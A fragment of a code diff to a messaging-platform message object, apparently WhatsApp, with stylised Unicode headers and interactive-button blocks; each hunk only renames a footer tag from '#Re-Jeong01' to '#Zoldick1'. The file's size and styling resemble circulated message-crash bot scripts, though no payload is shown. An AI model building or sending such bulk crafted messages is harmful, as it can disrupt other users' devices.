       "text": "🩸⃟༑⌁⃰꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉🥷👻 ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡🦠"
     },
     "footer": {
-      "text": "›          #Re-Jeong01"
+      "text": "›          #Zoldick1"
     },
     "nativeFlowMessage": {
       "buttons": [
@@ -2993,7 +2994,7 @@ message: {
       "text": "🩸⃟༑⌁⃰꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉🥷👻 ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡🦠"
     },
     "footer": {
-      "text": "›          #Re-Jeong01"
+      "text": "›          #Zoldick1"
     },
     "nativeFlowMessage": {
       "buttons": [
@@ -3032,7 +3033,7 @@ message: {
       "text": "🩸⃟༑⌁⃰꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉🥷👻 ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡🦠"
     },
     "footer": {
-      "text": "›          #Re-Jeong01"
+      "text": "›          #Zoldick1"
     },
     "nativeFlowMessage": {
       "buttons": [
